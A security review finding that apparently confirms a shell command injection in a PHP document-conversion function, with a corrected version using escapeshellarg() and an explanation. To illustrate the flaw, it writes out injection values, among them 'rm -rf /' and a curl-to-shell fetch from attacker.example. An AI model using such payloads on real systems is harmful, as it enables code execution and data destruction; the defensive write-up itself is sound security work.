## Verdict

Confirmed. The fallback conversion command on line 19 concatenates `$requestedName` (attacker-controlled, from `$_POST['document']`) directly into a shell command string passed to `exec()`, with no escaping. An attacker can inject shell metacharacters to run arbitrary commands.

## Source

`$_POST['document']` at line 24, passed unmodified into `convert_document()` as `$requestedName`.

## Fix

```php
function convert_document(string $requestedName): string
{
    $source = '/srv/uploads/' . basename($requestedName);
    $target = '/srv/converted/' . basename($requestedName) . '.pdf';

    $primary = sprintf(
        '/usr/bin/soffice --convert-to pdf %s --outdir /srv/converted',
        escapeshellarg($source)
    );
    exec($primary, $primaryOutput, $primaryStatus);

    if ($primaryStatus === 0) {
        return $target;
    }

    $fallback = sprintf(
        '/usr/bin/legacy-convert %s %s',
        escapeshellarg($source),
        escapeshellarg($target)
    );
    exec($fallback, $fallbackOutput, $fallbackStatus);

    return $fallbackStatus === 0 ? $target : '';
}

$path = convert_document($_POST['document']);
```

## Explanation

The primary conversion branch (lines 8-11) already builds its command safely: it wraps the source path in `escapeshellarg()` before interpolating it into the command string. The fallback branch on line 19 does not follow the same pattern — it concatenates the raw `$requestedName` value straight into the shell command, bypassing both the escaping and the `basename()` normalization that produced `$source`/`$target`.

Because `$requestedName` comes directly from `$_POST['document']`, a value such as `foo; rm -rf / #` or `foo $(curl attacker.example/x|sh)` reaches `exec()` as part of the shell command line and is executed by the shell, not treated as a filename.

The fix replaces the raw `$requestedName` interpolation with the already-sanitized `$source` and `$target` values (which passed through `basename()` to strip directory components) and wraps each in `escapeshellarg()` before building the command with `sprintf()`, exactly mirroring the pattern already used for the primary command. `escapeshellarg()` quotes the value and neutralizes shell metacharacters so it is passed to `legacy-convert` as a single literal argument rather than being interpreted by the shell.

Verification: pass a document name containing shell metacharacters (e.g. `test; touch /tmp/pwned`) through the fallback path (by making the primary `soffice` call fail) and confirm no injected command executes, and that the intended `legacy-convert` invocation still succeeds for a normal filename.
